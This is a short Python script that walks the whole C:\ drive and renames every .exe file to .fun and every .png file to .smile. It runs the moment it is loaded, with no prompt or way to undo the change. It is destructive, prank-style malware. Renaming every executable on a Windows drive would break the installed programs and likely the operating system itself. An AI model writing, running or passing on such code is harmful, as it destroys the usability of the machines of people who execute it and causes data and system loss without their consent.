import os

def change_extensions():
    for folder, subfolders, filenames in os.walk("C:\\"):
        for filename in filenames:
            if filename.endswith(".exe"):
                new_filename = filename[:-4] + ".fun"
                os.rename(os.path.join(folder, filename), os.path.join(folder, new_filename))
            if filename.endswith(".png"):
                new_filename = filename[:-4] + ".smile"
                os.rename(os.path.join(folder, filename), os.path.join(folder, new_filename))

change_extensions()
